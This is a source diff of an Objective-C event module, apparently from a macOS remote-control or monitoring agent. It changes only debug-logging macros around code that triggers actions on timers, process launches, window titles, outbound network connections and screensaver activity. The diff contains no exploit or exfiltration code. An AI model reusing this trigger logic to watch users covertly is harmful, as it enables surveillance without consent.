@@ -37,14 +37,15 @@
 #include <wchar.h>
 
 #import "RCSMEvents.h"
-#import "RCSMCommon.h"
 #import "RCSMTaskManager.h"
+
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
+
 
 // That's really stupid, check param.h
 // MAXCOMLEN	16		/* max command name remembered */ 
 #define SCREENSAVER_PROCESS @"ScreenSaverEngin"
-
-//#define DEBUG
 
 
 static RCSMEvents *sharedEvents = nil;
@@ -134,14 +135,14 @@ NSLock *connectionLock;
   NSDate *startThreadDate = [[NSDate date] retain];
   NSTimeInterval interval = 0;
   
-#ifdef DEBUG
+#ifdef DEBUG_EVENTS
   timerRawData = (timerStruct *)[[configuration objectForKey: @"data"] bytes];
   
   int ty  = timerRawData->type;
   uint lo = timerRawData->loDelay;
   
-  infoLog(ME, @"type (%d) - low (%d)", ty, lo / 1000);
-  infoLog(ME, @"type (%d) - startDate (%@)", ty, startThreadDate);
+  infoLog(@"type (%d) - low (%d)", ty, lo / 1000);
+  infoLog(@"type (%d) - startDate (%@)", ty, startThreadDate);
 #endif
 
   while ([configuration objectForKey: @"status"] != EVENT_STOP &&
@@ -164,8 +165,8 @@ NSLock *connectionLock;
             
             if (fabs(interval) >= low / 1000)
               {
-#ifdef DEBUG
-                infoLog(ME, @"TIMER_AFTER_STARTUP (%f) triggered", fabs(interval));
+#ifdef DEBUG_EVENTS
+                infoLog(@"TIMER_AFTER_STARTUP (%f) triggered", fabs(interval));
 #endif
                 
                 [taskManager triggerAction: actionID];
@@ -184,8 +185,8 @@ NSLock *connectionLock;
             
             if (fabs(interval) >= low / 1000)
               {
-#ifdef DEBUG
-                infoLog(ME, @"TIMER_LOOP (%f) triggered", fabs(interval));
+#ifdef DEBUG_EVENTS
+                infoLog(@"TIMER_LOOP (%f) triggered", fabs(interval));
 #endif
                 
                 if (startThreadDate != nil)
@@ -207,8 +208,8 @@ NSLock *connectionLock;
             
             if ([[NSDate date] isGreaterThan: givenDate])
               {
-#ifdef DEBUG
-                infoLog(ME, @"TIMER_DATE (%@) triggered", givenDate);
+#ifdef DEBUG_EVENTS
+                infoLog(@"TIMER_DATE (%@) triggered", givenDate);
 #endif
                 [taskManager triggerAction: actionID];
                 
@@ -240,8 +241,8 @@ NSLock *connectionLock;
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
     {
-#ifdef DEBUG_VERBOSE_1
-      NSLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
+#ifdef DEBUG_EVENTS
+      verboseLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
 #endif
       [configuration setValue: EVENT_STOPPED
                        forKey: @"status"];
@@ -274,14 +275,14 @@ NSLock *connectionLock;
   unichar *_process = (unichar *)(processRawData->name + 0x3);
   size_t _pLen       = _utf16len(_process);
   
-#ifdef DEBUG
+#ifdef DEBUG_EVENTS
   NSString *pr = [[NSString alloc] initWithCharacters: (unichar *)_process
                                                length: _pLen];
   
   if (lookForTitle == EVENT_PROCESS_NAME)
-    infoLog(ME, @"Looking for Process %@", pr);
+    infoLog(@"Looking for Process %@", pr);
   else if (lookForTitle == EVENT_PROCESS_WIN_TITLE)
-    infoLog(ME, @"Looking for Window Title %@", pr);
+    infoLog(@"Looking for Window Title %@", pr);
 #endif
 
   while ([configuration objectForKey: @"status"]    != EVENT_STOP
@@ -307,8 +308,8 @@ NSLock *connectionLock;
                 
                 if (onTermination != -1)
                   {
-#ifdef DEBUG
-                    infoLog(ME, @"Application (%@) Terminated, action %d", process, onTermination);
+#ifdef DEBUG_EVENTS
+                    infoLog(@"Application (%@) Terminated, action %d", process, onTermination);
 #endif
                     [taskManager triggerAction: onTermination];
                   }
@@ -316,13 +317,13 @@ NSLock *connectionLock;
             else if (processAlreadyFound == 0 && findProcessWithName([process lowercaseString]) == YES)
               {
                 processAlreadyFound = 1;
-#ifdef DEBUG
-                infoLog(ME, @"Application (%@) Executed, action %d", process, actionID);
+#ifdef DEBUG_EVENTS
+                infoLog(@"Application (%@) Executed, action %d", process, actionID);
 #endif
                 if ([taskManager triggerAction: actionID] == FALSE)
                   {
-#ifdef DEBUG
-                    errorLog(ME, @"Error while triggering action: %d", actionID);
+#ifdef DEBUG_EVENTS
+                    errorLog(@"Error while triggering action: %d", actionID);
 #endif
                   }
               }
@@ -354,8 +355,8 @@ NSLock *connectionLock;
                 
                 if (onTermination != -1)
                   {
-#ifdef DEBUG
-                    infoLog(ME, @"Window Title (%@) found (onTermination), action %d",
+#ifdef DEBUG_EVENTS
+                    infoLog(@"Window Title (%@) found (onTermination), action %d",
                             process, onTermination);
 #endif
                     [taskManager triggerAction: onTermination];
@@ -364,8 +365,8 @@ NSLock *connectionLock;
             else if (processAlreadyFound == 0 && titleFound == YES)
               {
                 processAlreadyFound = 1;
-#ifdef DEBUG
-                infoLog(ME, @"Window Title (%@) found, action %d", process, actionID);
+#ifdef DEBUG_EVENTS
+                infoLog(@"Window Title (%@) found, action %d", process, actionID);
 #endif
                 [taskManager triggerAction: actionID];
               }
@@ -384,8 +385,8 @@ NSLock *connectionLock;
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
     {
-#ifdef DEBUG_VERBOSE_1
-      NSLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
+#ifdef DEBUG_EVENTS
+      verboseLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
 #endif
       [configuration setValue: EVENT_STOPPED
                        forKey: @"status"];
@@ -437,8 +438,8 @@ NSLock *connectionLock;
       struct in_addr tempAddress;
       tempAddress.s_addr = ipAddress;
 
-#ifdef DEBUG_VERBOSE_1
-      infoLog(ME, @"IP Address to Match: %s", inet_ntoa(tempAddress));
+#ifdef DEBUG_EVENTS
+      verboseLog(@"IP Address to Match: %s", inet_ntoa(tempAddress));
 #endif
 
       if (sysctlbyname(mibName, 0, &len, 0, 0) >= 0)
@@ -447,8 +448,8 @@ NSLock *connectionLock;
             {
               if (sysctlbyname(mibName, buffer, &len, 0, 0) < 0)
                 {
-#ifdef DEBUG
-                  errorLog(ME, @"Error on second sysctlbyname call");
+#ifdef DEBUG_EVENTS
+                  errorLog(@"Error on second sysctlbyname call");
 #endif
                   
                   free(buffer);
@@ -458,8 +459,8 @@ NSLock *connectionLock;
             }
           else
             {
-#ifdef DEBUG
-              errorLog(ME, @"Error on malloc");
+#ifdef DEBUG_EVENTS
+              errorLog(@"Error on malloc");
 #endif
               
               free(buffer);
@@ -468,8 +469,8 @@ NSLock *connectionLock;
         }
       else
         {
-#ifdef DEBUG
-          errorLog(ME, @"Error on first sysctlbyname call");
+#ifdef DEBUG_EVENTS
+          errorLog(@"Error on first sysctlbyname call");
 #endif
           
           free(buffer);
@@ -509,9 +510,9 @@ NSLock *connectionLock;
                                                          state,
                                                          strlen(state)) == 0)
             {
-#ifdef DEBUG_VERBOSE_1
-              infoLog(ME, @"Found an established connection: %s", inet_ntoa(inp->inp_faddr));
-              infoLog(ME, @"Configured netmask: %@", ipNetmask);
+#ifdef DEBUG_EVENTS
+              verboseLog(@"Found an established connection: %s", inet_ntoa(inp->inp_faddr));
+              verboseLog(@"Configured netmask: %@", ipNetmask);
 #endif
               
               //
@@ -521,8 +522,8 @@ NSLock *connectionLock;
               if (isAddressOnLan(inp->inp_faddr) == FALSE
                   && compareIpAddress(inp->inp_faddr, tempAddress, netMask) == TRUE)
                 {
-#ifdef DEBUG
-                  infoLog(ME, @"Address in list: %s (not on lan)", inet_ntoa(inp->inp_faddr));
+#ifdef DEBUG_EVENTS
+                  infoLog(@"Address in list: %s (not on lan)", inet_ntoa(inp->inp_faddr));
 #endif
                   
                   if (connectionPort == 0 || inp->inp_fport == connectionPort)
@@ -551,8 +552,8 @@ NSLock *connectionLock;
                           [objects release];
                           [connection release];
                           
-#ifdef DEBUG
-                          warnLog(ME, @"Event Connection triggered!");
+#ifdef DEBUG_EVENTS
+                          warnLog(@"Event Connection triggered!");
 #endif
                           [taskManager triggerAction: actionID];
                         }
@@ -569,8 +570,8 @@ NSLock *connectionLock;
                                    connectionsDetected) == TRUE
           && connectionFound                            == FALSE)
         {
-#ifdef DEBUG
-          infoLog(ME, @"Removing Connection");
+#ifdef DEBUG_EVENTS
+          infoLog(@"Removing Connection");
 #endif
           //
           // Connection has been found previously and now it's not there anymore
@@ -600,8 +601,8 @@ NSLock *connectionLock;
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
     {
-#ifdef DEBUG_VERBOSE_1
-      infoLog(ME, @"Object Status: %@", [configuration objectForKey: @"status"]);
+#ifdef DEBUG_EVENTS
+      verboseLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
 #endif
       [configuration setValue: EVENT_STOPPED forKey: @"status"];
       
@@ -637,8 +638,8 @@ NSLock *connectionLock;
 
           if (onTermination != -1)
             {
-#ifdef DEBUG
-              NSLog(@"Application (%@) Terminated, action %d", process, onTermination);
+#ifdef DEBUG_EVENTS
+              infoLog(@"Application (%@) Terminated, action %d", process, onTermination);
 #endif
               [taskManager triggerAction: onTermination];
             }
@@ -646,8 +647,8 @@ NSLock *connectionLock;
       else if (screenSaverFound == FALSE && findProcessWithName([process lowercaseString]) == YES)
         {
           screenSaverFound = TRUE;
-#ifdef DEBUG
-          NSLog(@"Application (%@) Executed, action %d", process, actionID);
+#ifdef DEBUG_EVENTS
+          infoLog(@"Application (%@) Executed, action %d", process, actionID);
 #endif
           [taskManager triggerAction: actionID];
         }
@@ -660,8 +661,8 @@ NSLock *connectionLock;
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
     {
-#ifdef DEBUG_VERBOSE_1
-      NSLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
+#ifdef DEBUG_EVENTS
+      verboseLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
 #endif
       [configuration setValue: EVENT_STOPPED forKey: @"status"];
       [configuration release];
